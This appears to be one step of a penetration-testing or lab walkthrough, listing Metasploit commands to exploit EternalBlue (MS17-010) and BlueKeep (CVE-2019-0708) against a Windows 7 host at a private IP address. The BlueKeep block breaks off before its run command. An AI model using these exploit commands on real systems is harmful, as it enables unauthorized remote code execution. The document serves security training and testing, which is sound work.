# Exploitation

## Overview

In this step, we exploit the identified vulnerabilities on the target Windows 7 system to gain unauthorized access. We use tools like Metasploit to perform these exploits.

## Tools Used

- Metasploit
- MSFvenom

## Steps and Commands

### Exploit: EternalBlue (MS17-010)

**Tool: Metasploit**
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
exploit
```

*Description: This Metasploit module exploits the EternalBlue vulnerability to gain remote code execution.*

### Exploit: BlueKeep (CVE-2019-0708)

**Tool: Metasploit**
```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOST 192.168.1.100
